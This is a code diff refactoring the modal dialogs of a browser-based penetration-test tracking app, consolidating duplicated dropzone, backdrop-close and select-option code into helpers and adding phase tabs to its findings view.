-        let opts = '<option value="">Root Level (no parent)</option>';
-        opts += epNew.samePhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('');
-        if (epNew.crossPhase.length) {
-          const prevLabel = checklistPhases.find(p => p.id === epNew.prevPhaseId)?.name || epNew.prevPhaseId;
-          opts += `<optgroup label="Cross-phase (${prevLabel})">` +
-            epNew.crossPhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('') +
-            '</optgroup>';
-        }
-        sel.innerHTML = opts;
-      });
-
-      // File input
-      const fvmInput = container.querySelector('#fvmEvidenceInput');
-      fvmInput.addEventListener('change', (e) => { addFvmFiles(e.target.files || []); e.target.value = ''; });
+      wirePhaseParentSync(container, 'fvmPhase', 'fvmParentId', finding.machine_id, excludeIds, finding.parent_id, machineById(finding.machine_id));
 
       // Dropzone
+      const fvmInput = container.querySelector('#fvmEvidenceInput');
       const fvmDrop = container.querySelector('#fvmEvidenceDrop');
-      fvmDrop.addEventListener('click', () => fvmInput.click());
-      fvmDrop.addEventListener('dragover', (e) => { e.preventDefault(); fvmDrop.classList.add('drag-over'); });
-      fvmDrop.addEventListener('mouseenter', () => { fvmDrop.focus({ preventScroll: true }); });
-      fvmDrop.addEventListener('dragleave', () => { fvmDrop.classList.remove('drag-over'); });
-      fvmDrop.addEventListener('drop', (e) => { e.preventDefault(); fvmDrop.classList.remove('drag-over'); addFvmFiles(e.dataTransfer?.files || []); });
-      fvmDrop.addEventListener('paste', (e) => { const f = getImageFilesFromList(e.clipboardData?.files || []); if (f.length) { e.preventDefault(); addFvmFiles(f); } });
+      wireDropzone(fvmDrop, fvmInput, addFvmFiles);
 
       // Open existing evidence
       container.querySelectorAll('[data-fvm-open-evidence]').forEach(btn => {
@@ -3811,18 +3660,35 @@ function openFindingViewModal(findingId) {
 
   renderView(false);
   showDialogSafely(modal);
-  modal.addEventListener('click', function backdropClose(e) {
-    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
-  });
+  addBackdropClose(modal);
 }
 
 /* ═══════════════════════════════════════════════
    Findings Modal
    ═══════════════════════════════════════════════ */
+/**
+ * Open the “All Findings” modal with phase-tab navigation, add-finding form,
+ * and an archived findings section with restore/permanent-delete options.
+ */
 function openFindingsModal(machine) {
   const modal = document.getElementById('findingsModal');
   const container = document.getElementById('findingsModalContent');
   if (!modal || !container) return;
+
+  const machinePhases = checklistPhaseCatalogForMachine(machine);
+  const PHASE_DEFS = [
+    { id: 'all', label: 'Default' },
+    ...machinePhases.map((phase) => ({
+      id: phase.id,
+      label: phase.id === 'osint'
+        ? 'OSINT'
+        : phase.id === 'recon'
+          ? 'Enumeration'
+          : phase.id === 'post_exploitation'
+            ? 'Post-Exploit'
+            : phase.name,
+    })),
+  ];
 
   let showForm = false;
   let evidenceBuffer = [];
@@ -3850,15 +3716,28 @@ function openFindingsModal(machine) {
 
   function renderContent() {
     const findings = machineFindings(machine.id);
+    const activePhaseRaw = state.ui.mmPhase || 'all';
+    const activePhase = PHASE_DEFS.some((phaseDef) => phaseDef.id === activePhaseRaw) ? activePhaseRaw : 'all';
+    const filteredFindings = activePhase === 'all'
+      ? findings
+      : findings.filter((finding) => (finding.phase || 'unknown') === activePhase);
+    const activePhaseName = activePhase === 'all'
+      ? 'All Phases'
+      : (machinePhases.find((phase) => phase.id === activePhase)?.name || activePhase);
 
     container.innerHTML = `
       <div class="fm-header">
-        <h2>Findings <span class="badge">${findings.length}</span></h2>
+        <h2>Findings <span class="badge">${filteredFindings.length}</span></h2>
         <button class="btn btn-ghost" id="fmClose">✕</button>
       </div>
       <div class="fm-body">
         <div class="fm-toolbar">
           <button class="btn btn-primary btn-sm" id="fmAddBtn">+ Add Finding</button>
+        </div>
+        <div class="mm-phase-tabs fm-phase-tabs" style="margin-bottom:.7rem">
+          ${PHASE_DEFS.map((phaseDef) => `
+            <button class="mm-phase-btn${activePhase === phaseDef.id ? ' mm-phase-btn--active' : ''}${phaseDef.id === 'all' ? ' mm-phase-btn--all' : ''}" data-fm-phase="${phaseDef.id}">${phaseDef.label}</button>
+          `).join('')}
         </div>
         ${showForm ? `
           <div class="inline-form card" style="margin-bottom:1rem">
@@ -3867,30 +3746,17 @@ function openFindingsModal(machine) {
             <div class="split">
               <label>Severity
                 <select id="fmSeverity">
-                  <option value="critical">Critical</option>
-                  <option value="high" selected>High</option>
-                  <option value="medium">Medium</option>
-                  <option value="low">Low</option>
-                  <option value="info">Info</option>
+                  ${severityOptionsHtml('high')}
                 </select>
               </label>
               <label>Phase
-                <select id="fmPhase">${checklistPhases.map(p => `<option value="${p.id}">${p.name}</option>`).join('')}</select>
+                <select id="fmPhase">${phaseOptionsHtml(machinePhases)}</select>
               </label>
             </div>
             <label>Parent Finding
               <select id="fmParent">
                 <option value="">Root Level (no parent)</option>
-                ${(() => {
-                  const firstPhase = checklistPhases[0]?.id || '';
-                  const epFm = buildEligibleParents(machine.id, firstPhase, new Set());
-                  let o = epFm.samePhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('');
-                  if (epFm.crossPhase.length) {
-                    o += `<optgroup label="Cross-phase (${epFm.prevPhaseId})">` +
-                      epFm.crossPhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('') + '</optgroup>';
-                  }
-                  return o;
-                })()}
+                ${parentFindingOptionsHtml(machine.id, machinePhases[0]?.id || '', new Set(), null, machine)}
               </select>
             </label>
             <input id="fmEvidenceInput" type="file" accept="image/*" multiple style="display:none">
@@ -3902,12 +3768,15 @@ function openFindingsModal(machine) {
             </div>
           </div>
         ` : ''}
-        ${!findings.length ? '<p class="small dim" style="padding:1rem;text-align:center">No findings documented yet.</p>' : `
+        ${!filteredFindings.length ? `<p class="small dim" style="padding:1rem;text-align:center">No findings documented for ${activePhaseName}.</p>` : `
           <div class="finding-list">
             ${(() => {
-              const knownPhases = ['osint','recon','exploitation','post_exploitation','persistence'];
+              if (activePhase !== 'all') {
+                return buildFindingCards(filteredFindings, null, 0);
+              }
+              const knownPhases = machinePhases.map((phase) => phase.id);
               let html = knownPhases.map(pid => {
-                const phase = checklistPhases.find(p => p.id === pid);
+                const phase = machinePhases.find(p => p.id === pid);
                 const phaseFindings = findings.filter(f => (f.phase || 'unknown') === pid);
                 if (!phaseFindings.length) return '';
                 const pColor = phaseColor(pid);
@@ -4007,6 +3876,17 @@ function openFindingsModal(machine) {
     /* close */
     container.querySelector('#fmClose').addEventListener('click', () => modal.close());
 
+    container.querySelectorAll('[data-fm-phase]').forEach((button) => {
+      button.addEventListener('click', () => {
+        state.ui.mmPhase = button.dataset.fmPhase;
+        const mmContainer = document.getElementById('mm-container-' + machine.id);
+        if (mmContainer) {
+          refreshMindMapInPlace(machine);
+        }
+        renderContent();
+      });
+    });
+
     /* toggle add form */
     container.querySelector('#fmAddBtn').addEventListener('click', () => {
       showForm = !showForm;
@@ -4022,27 +3902,9 @@ function openFindingsModal(machine) {
 
       const fileInput = container.querySelector('#fmEvidenceInput');
       const dropzone  = container.querySelector('#fmEvidenceDrop');
-      dropzone?.addEventListener('click', () => fileInput?.click());
-      fileInput?.addEventListener('change', e => { addToEvidenceBuffer(e.target.files || []); e.target.value = ''; });
-      dropzone?.addEventListener('dragover', e => { e.preventDefault(); dropzone.classList.add('drag-over'); });
-      dropzone?.addEventListener('dragleave', () => dropzone.classList.remove('drag-over'));
-      dropzone?.addEventListener('drop', e => { e.preventDefault(); dropzone.classList.remove('drag-over'); addToEvidenceBuffer(e.dataTransfer?.files || []); });
-      dropzone?.addEventListener('paste', e => { const imgs = getImageFilesFromList(e.clipboardData?.files || []); if (imgs.length) { e.preventDefault(); addToEvidenceBuffer(imgs); } });
-      dropzone?.addEventListener('mouseenter', () => dropzone.focus({ preventScroll: true }));
+      wireDropzone(dropzone, fileInput, addToEvidenceBuffer);
 
-      container.querySelector('#fmPhase')?.addEventListener('change', e => {
-        const sel = container.querySelector('#fmParent');
-        if (!sel) return;
-        const epFm = buildEligibleParents(machine.id, e.target.value, new Set());
-        let opts = '<option value="">Root Level (no parent)</option>';
-        opts += epFm.samePhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('');
-        if (epFm.crossPhase.length) {
-          const prevLabel = checklistPhases.find(p => p.id === epFm.prevPhaseId)?.name || epFm.prevPhaseId;
-          opts += `<optgroup label="Cross-phase (${prevLabel})">` +
-            epFm.crossPhase.map(f => `<option value="${f.id}">${f.title} [${f.severity}]</option>`).join('') + '</optgroup>';
-        }
-        sel.innerHTML = opts;
-      });
+      wirePhaseParentSync(container, 'fmPhase', 'fmParent', machine.id, new Set(), null, machine);
 
       container.querySelector('#fmSubmitForm').addEventListener('click', async () => {
         const title = container.querySelector('#fmTitle').value.trim();
@@ -4075,40 +3937,14 @@ function openFindingsModal(machine) {
     /* delete finding (archives evidence & credentials) */
     container.querySelectorAll('[data-delete-finding]').forEach(btn => {
       btn.addEventListener('click', async () => {
+        if (!armConfirmButton(btn)) return;
         const finding = state.findings.find(f => f.id === btn.dataset.deleteFinding);
         if (!finding) return;
-        if (!confirm(`Delete finding "${finding.title}"?\n\nAny tied evidence and credentials will be moved to the Archived section.`)) return;
 
-        if (!machine.archived_evidence) machine.archived_evidence = [];
-        if (!machine.archived_credentials) machine.archived_credentials = [];
-
-        /* Archive evidence */
-        for (const ev of (finding.evidence || [])) {
-          machine.archived_evidence.push({
-            ...ev,
-            archived_at: new Date().toISOString(),
-            source_finding_title: finding.title,
-            source_finding_id: finding.id,
-            source_type: 'finding_deleted_manually',
-          });
-        }
-
-        /* Archive credentials linked to this finding */
-        const linkedCreds = state.credentials.filter(c => c.finding_id === finding.id);
-        for (const cred of linkedCreds) {
-          machine.archived_credentials.push({
-            ...cred,
-            finding_id: null,
-            archived_at: new Date().toISOString(),
-            source_finding_title: finding.title,
-            source_finding_id: finding.id,
-            source_type: 'finding_deleted_manually',
-          });
-          state.credentials = state.credentials.filter(c => c.id !== cred.id);
-        }
+        const archivedCreds = archiveFindingData(machine, finding, 'finding_deleted_manually');
 
         state.findings = state.findings.filter(f => f.id !== finding.id);
-        const archivedCount = (finding.evidence || []).length + linkedCreds.length;
+        const archivedCount = (finding.evidence || []).length + archivedCreds;
         addActivity('updated_machine', `Deleted finding: ${finding.title}${archivedCount ? `. Archived ${archivedCount} item(s).` : ''}`, machine.id);
         persist();
         mount();
@@ -4129,6 +3965,7 @@ function openFindingsModal(machine) {
     /* delete finding evidence */
     container.querySelectorAll('[data-delete-finding-evidence]').forEach(btn => {
       btn.addEventListener('click', async () => {
+        if (!armConfirmButton(btn)) return;
         const finding = state.findings.find(f => f.id === btn.dataset.findingId);
         if (!finding) return;
         await deleteEvidenceFile(btn.dataset.deleteFindingEvidence);
@@ -4217,14 +4054,13 @@ function openFindingsModal(machine) {
 
   renderContent();
   showDialogSafely(modal);
-  modal.addEventListener('click', function backdropClose(e) {
-    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
-  });
+  addBackdropClose(modal);
 }
 
 /* ═══════════════════════════════════════════════
    Notes Modal
    ═══════════════════════════════════════════════ */
+/** Open the notes modal — a full-screen textarea for per-machine notes. */
 function openNotesModal(machine) {
   const modal = document.getElementById('notesModal');
   const container = document.getElementById('notesModalContent');
@@ -4256,33 +4092,35 @@ function openNotesModal(machine) {
 
   showDialogSafely(modal);
   container.querySelector('#nmTextarea').focus();
-  modal.addEventListener('click', function backdropClose(e) {
-    if (e.target === modal) {
-      machine.notes = container.querySelector('#nmTextarea')?.value ?? machine.notes;
-      persist();
-      modal.close();
-      modal.removeEventListener('click', backdropClose);
-    }
+  addBackdropClose(modal, () => {
+    machine.notes = container.querySelector('#nmTextarea')?.value ?? machine.notes;
+    persist();
   });
 }
 
 /* ═══════════════════════════════════════════════
    Evidence Modal
    ═══════════════════════════════════════════════ */
+/**
+ * Open the evidence gallery modal, showing all evidence files grouped
+ * by checklist phase.  Includes an archived evidence section at the bottom.
+ */
 function openEvidenceModal(machine) {
   const modal = document.getElementById('evidenceModal');
   const container = document.getElementById('evidenceModalContent');
   if (!modal || !container) return;
 
+  const machinePhases = checklistPhaseCatalogForMachine(machine);
+
   function itemPhase(itemId) {
-    for (const phase of checklistPhases) {
+    for (const phase of machinePhases) {
       if (phase.items.some(i => i.id === itemId)) return phase.id;
     }
     return 'unknown';
   }
 
   function itemName(itemId) {
-    for (const phase of checklistPhases) {
+    for (const phase of machinePhases) {
       const item = phase.items.find(i => i.id === itemId);
       if (item) return item.name;
     }
@@ -4332,9 +4170,9 @@ function openEvidenceModal(machine) {
         ${!evidenceItems.length ? '<p class="small dim" style="padding:1rem;text-align:center">No evidence files yet. Add evidence via Findings or Checklist items.</p>' : `
           <div class="finding-list">
             ${(() => {
-              const knownPhases = ['osint','recon','exploitation','post_exploitation','persistence'];
+              const knownPhases = machinePhases.map((phase) => phase.id);
               let html = knownPhases.map(pid => {
-              const phase = checklistPhases.find(p => p.id === pid);
+              const phase = machinePhases.find(p => p.id === pid);
               const phaseEvidence = evidenceItems.filter(e => e.phase === pid);
               if (!phaseEvidence.length) return '';
               const pColor = phaseColor(pid);
@@ -4470,14 +4308,16 @@ function openEvidenceModal(machine) {
 
   renderContent();
   showDialogSafely(modal);
-  modal.addEventListener('click', function backdropClose(e) {
-    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
-  });
+  addBackdropClose(modal);
 }
 
 /* ═══════════════════════════════════════════════
    Credential Edit Modal
    ═══════════════════════════════════════════════ */
+/**
+ * Open the “All Credentials” modal showing all credentials for the machine,
+ * with add form, finding link/unlink controls, and delete confirmation.
+ */
 function openCredAllModal(machine) {
   const modal = document.getElementById('credAllModal');
   const container = document.getElementById('credAllContent');
@@ -4514,10 +4354,7 @@ function openCredAllModal(machine) {
           <label>Password / Hash<input id="caPassword" placeholder="" /></label>
           <label>Type
             <select id="caType">
-              <option value="plain">Plain Text</option>
-              <option value="hash">Hash</option>
-              <option value="key">SSH Key</option>
-              <option value="token">Token</option>
+              ${credTypeOptionsHtml()}
             </select>
           </label>
           <div class="modal-actions">
@@ -4689,11 +4526,10 @@ function openCredAllModal(machine) {
     modal.removeEventListener('close', onClose);
     mount();
   });
-  modal.addEventListener('click', function backdropClose(e) {
-    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
-  });
+  addBackdropClose(modal);
 }
 
+/** Open an inline edit modal for a single credential record. */
 function openCredEditModal(credId) {
   const credential = state.credentials.find(c => c.id === credId);
   if (!credential) return;
@@ -4710,7 +4546,7 @@ function openCredEditModal(credId) {
     <label>Password / Hash<input id="cePassword" type="text" value="${(credential.password || '').replace(/"/g, '&quot;')}" /></label>
     <label>Type
       <select id="ceType">
-        ${['plain','hash','key','token'].map(t => `<option value="${t}"${t === credential.cred_type ? ' selected' : ''}>${t.charAt(0).toUpperCase() + t.slice(1)}</option>`).join('')}
+        ${credTypeOptionsHtml(credential.cred_type)}
       </select>
     </label>
     <div class="modal-actions">
@@ -4734,32 +4570,26 @@ function openCredEditModal(credId) {
 
   showDialogSafely(modal);
   document.getElementById('ceUsername')?.select();
-  modal.addEventListener('click', function backdropClose(e) {
-    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
-  });
+  addBackdropClose(modal);
 }
 
 /* ═══════════════════════════════════════════════
    Quick Finding Modal (checklist task / evidence)
    ═══════════════════════════════════════════════ */
+/**
+ * Quick finding creation modal triggered from the checklist.
+ * Pre-fills phase based on the checklist item, and optionally
+ * attaches evidence screenshots passed from the check event.
+ */
 function openQuickFindingModal(machine, itemId, prefillEvidence = []) {
   const item = checklistItemById(itemId);
   const phase = checklistPhaseForItem(itemId);
+  const machinePhases = checklistPhaseCatalogForMachine(machine);
   const modal = document.getElementById('quickFindingModal');
   const container = document.getElementById('quickFindingContent');
   if (!modal || !container) return;
 
-  const parentOptions = () => {
-    const selPhase = container.querySelector('#qfPhase')?.value || phase?.id || '';
-    const epQf = buildEligibleParents(machine.id, selPhase, new Set());
-    let opts = epQf.samePhase.map(p => `<option value="${p.id}">${p.title} [${p.severity}]</option>`).join('');
-    if (epQf.crossPhase.length) {
-      const prevLabel = checklistPhases.find(p => p.id === epQf.prevPhaseId)?.name || epQf.prevPhaseId;
-      opts += `<optgroup label="Cross-phase (${prevLabel})">` +
-        epQf.crossPhase.map(p => `<option value="${p.id}">${p.title} [${p.severity}]</option>`).join('') + '</optgroup>';
-    }
-    return opts;
-  };
+  const initPhase = phase?.id || '';
 
   container.innerHTML = `
     <h2 style="margin-bottom:.25rem">Create Finding</h2>
@@ -4769,19 +4599,19 @@ function openQuickFindingModal(machine, itemId, prefillEvidence = []) {
     <div class="split">
       <label>Severity
         <select id="qfSev">
-          ${['critical','high','medium','low','info'].map(s => `<option value="${s}"${s === 'info' ? ' selected' : ''}>${s.charAt(0).toUpperCase() + s.slice(1)}</option>`).join('')}
+          ${severityOptionsHtml('info')}
         </select>
       </label>
       <label>Phase
         <select id="qfPhase">
-          ${checklistPhases.map(p => `<option value="${p.id}"${p.id === (phase?.id || '') ? ' selected' : ''}>${p.name}</option>`).join('')}
+          ${phaseOptionsHtml(machinePhases, phase?.id || '')}
         </select>
       </label>
     </div>
     <label>Parent Finding
       <select id="qfParentId">
         <option value="">Root Level (no parent)</option>
-        ${parentOptions()}
+        ${parentFindingOptionsHtml(machine.id, initPhase, new Set(), null, machine)}
       </select>
     </label>
     ${prefillEvidence.length ? `
@@ -4798,11 +4628,7 @@ function openQuickFindingModal(machine, itemId, prefillEvidence = []) {
     </div>
   `;
 
-  container.querySelector('#qfPhase')?.addEventListener('change', () => {
-    const sel = container.querySelector('#qfParentId');
-    if (!sel) return;
-    sel.innerHTML = '<option value="">Root Level (no parent)</option>' + parentOptions();
-  });
+  wirePhaseParentSync(container, 'qfPhase', 'qfParentId', machine.id, new Set(), null, machine);
 
   container.querySelector('#qfSkip').addEventListener('click', () => modal.close());
   container.querySelector('#qfSave').addEventListener('click', () => {
@@ -4830,32 +4656,28 @@ function openQuickFindingModal(machine, itemId, prefillEvidence = []) {
 
   showDialogSafely(modal);
   document.getElementById('qfTitle')?.select();
-  modal.addEventListener('click', function backdropClose(e) {
-    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
-  });
+  addBackdropClose(modal);
 }
 
 /* ═══════════════════════════════════════════════
    Finding Edit Modal (findings tab → direct edit)
    ═══════════════════════════════════════════════ */
+/**
+ * Direct finding edit modal — full form with title, description, severity,
+ * phase, parent, evidence management, and credential linking.
+ * Used from mind map node clicks and finding list edit buttons.
+ */
 function openFindingEditModal(findingId) {
   const finding = state.findings.find(f => f.id === findingId);
   if (!finding) return;
+  const machine = machineById(finding.machine_id);
+  const machinePhases = checklistPhaseCatalogForMachine(machine);
   const modal = document.getElementById('findingEditModal');
   const container = document.getElementById('findingEditContent');
   let femEvidenceBuffer = [];
 
-  // Build eligible parent options (exclude self and all descendants)
-  function getDescendantIds(id, all) {
-    return [id, ...all.filter(f => f.parent_id === id).flatMap(c => getDescendantIds(c.id, all))];
-  }
   const excludeIds = new Set(getDescendantIds(finding.id, state.findings));
-  const ep = buildEligibleParents(finding.machine_id, finding.phase, excludeIds);
-  const parentOptsSame = ep.samePhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('');
-  const parentOptsCross = ep.crossPhase.length
-    ? `<optgroup label="Cross-phase (${checklistPhases.find(p => p.id === ep.prevPhaseId)?.name || ep.prevPhaseId})">` +
-      ep.crossPhase.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('') +
-      '</optgroup>' : '';
+  const parentOptsHtml = parentFindingOptionsHtml(finding.machine_id, finding.phase, excludeIds, finding.parent_id, machine);
   const createdText = formatDateTimeMilitary(finding.created_at);
   const changedText = formatDateTimeMilitary(finding.updated_at || finding.created_at);
 
@@ -4876,19 +4698,19 @@ function openFindingEditModal(findingId) {
     <div class="split">
       <label>Severity
         <select id="femSev">
-          ${['critical','high','medium','low','info'].map(s => `<option value="${s}"${s === finding.severity ? ' selected' : ''}>${s.charAt(0).toUpperCase() + s.slice(1)}</option>`).join('')}
+          ${severityOptionsHtml(finding.severity)}
         </select>
       </label>
       <label>Phase
         <select id="femPhase">
-          ${checklistPhases.map(p => `<option value="${p.id}"${p.id === finding.phase ? ' selected' : ''}>${p.name}</option>`).join('')}
+          ${phaseOptionsHtml(machinePhases, finding.phase)}
         </select>
       </label>
     </div>
     <label>Parent Finding
       <select id="femParentId">
         <option value="">Root Level (no parent)</option>
-        ${parentOptsSame}${parentOptsCross}
+        ${parentOptsHtml}
       </select>
     </label>
     <div class="finding-cred-box">
@@ -4912,10 +4734,7 @@ function openFindingEditModal(findingId) {
           <label>Password / Hash<input id="femNewCredPass" /></label>
           <label>Type
             <select id="femNewCredType">
-              <option value="plain">Plain Text</option>
-              <option value="hash">Hash</option>
-              <option value="key">SSH Key</option>
-              <option value="token">Token</option>
+              ${credTypeOptionsHtml()}
             </select>
           </label>
         </div>
@@ -5028,27 +4847,12 @@ function openFindingEditModal(findingId) {
     });
   }
 
-  // Rebuild parent options dynamically when phase changes (fem)
-  container.querySelector('#femPhase')?.addEventListener('change', (e) => {
-    const sel = container.querySelector('#femParentId');
-    if (!sel) return;
-    const newPhaseFindings = machineFindings(finding.machine_id).filter(f => !excludeIds.has(f.id) && f.phase === e.target.value);
-    sel.innerHTML = '<option value="">Root Level (no parent)</option>' +
-      newPhaseFindings.map(p => `<option value="${p.id}"${p.id === finding.parent_id ? ' selected' : ''}>${p.title} [${p.severity}]</option>`).join('');
-  });
-
-  // File input
-  const femInput = container.querySelector('#femEvidenceInput');
-  femInput.addEventListener('change', (e) => { addFemFiles(e.target.files || []); e.target.value = ''; });
+  wirePhaseParentSync(container, 'femPhase', 'femParentId', finding.machine_id, excludeIds, finding.parent_id, machineById(finding.machine_id));
 
   // Dropzone
+  const femInput = container.querySelector('#femEvidenceInput');
   const femDrop = container.querySelector('#femEvidenceDrop');
-  femDrop.addEventListener('click', () => femInput.click());
-  femDrop.addEventListener('dragover', (e) => { e.preventDefault(); femDrop.classList.add('drag-over'); });
-  femDrop.addEventListener('mouseenter', () => { femDrop.focus({ preventScroll: true }); });
-  femDrop.addEventListener('dragleave', () => { femDrop.classList.remove('drag-over'); });
-  femDrop.addEventListener('drop', (e) => { e.preventDefault(); femDrop.classList.remove('drag-over'); addFemFiles(e.dataTransfer?.files || []); });
-  femDrop.addEventListener('paste', (e) => { const f = getImageFilesFromList(e.clipboardData?.files || []); if (f.length) { e.preventDefault(); addFemFiles(f); } });
+  wireDropzone(femDrop, femInput, addFemFiles);
 
   // Open existing evidence
   container.querySelectorAll('[data-fem-open-evidence]').forEach(btn => {
@@ -5192,18 +4996,23 @@ function openFindingEditModal(findingId) {
   });
 
   showDialogSafely(modal);
-  modal.addEventListener('click', function backdropClose(e) {
-    if (e.target === modal) { modal.close(); modal.removeEventListener('click', backdropClose); }
-  });
+  addBackdropClose(modal);
 }
 
+/** Populate the machine <select> dropdown in the Add Credential form. */
 function fillMachineSelect() {
   const select = document.getElementById('credMachineSelect');
   select.innerHTML = '<option value="">Select machine</option>' + state.machines.map((machine) => `<option value="${machine.id}">${machine.ip}${machine.hostname ? ` (${machine.hostname})` : ''}</option>`).join('');
 }
 
+/* ───────────────────────────────────────────────
+  27. Global Event Listeners & Initial Mount
+   ─────────────────────────────────────────────── */
+
+/* Re-render the page whenever the URL hash changes. */
 window.addEventListener('hashchange', mount);
 
+/* Sidebar collapse/expand toggle. */
 document.getElementById('sidebarToggle').addEventListener('click', () => {
   state.ui.sidebarCollapsed = !state.ui.sidebarCollapsed;
   sidebar.classList.toggle('collapsed', state.ui.sidebarCollapsed);
@@ -5212,6 +5021,7 @@ document.getElementById('sidebarToggle').addEventListener('click', () => {
   persist();
 });
 
+/* Cancel buttons on the static Add Machine / Add Credential modals. */
 document.getElementById('cancelMachine').addEventListener('click', () => {
   document.getElementById('machineModal').close();
 });
@@ -5220,6 +5030,7 @@ document.getElementById('cancelCred').addEventListener('click', () => {
   document.getElementById('credModal').close();
 });
 
+/* Submit handler: create a new machine and re-mount. */
 document.getElementById('machineForm').addEventListener('submit', (event) => {
   event.preventDefault();
   const form = new FormData(event.target);
@@ -5249,6 +5060,7 @@ document.getElementById('machineForm').addEventListener('submit', (event) => {
   mount();
 });
 
+/* Submit handler: create a new credential and re-mount. */
 document.getElementById('credForm').addEventListener('submit', (event) => {
   event.preventDefault();
   const form = new FormData(event.target);
@@ -5271,12 +5083,14 @@ document.getElementById('credForm').addEventListener('submit', (event) => {
   mount();
 });
 
+/* Restore collapsed sidebar state from persisted UI prefs. */
 if (state.ui.sidebarCollapsed) {
   sidebar.classList.add('collapsed');
   brand.style.display = 'none';
   document.getElementById('sidebarToggle').textContent = '▶';
 }
 
+/* Ensure a default hash route exists, request persistent storage, and boot. */
 if (!window.location.hash) window.location.hash = '#/';
 requestPersistentStorage();
 mount();
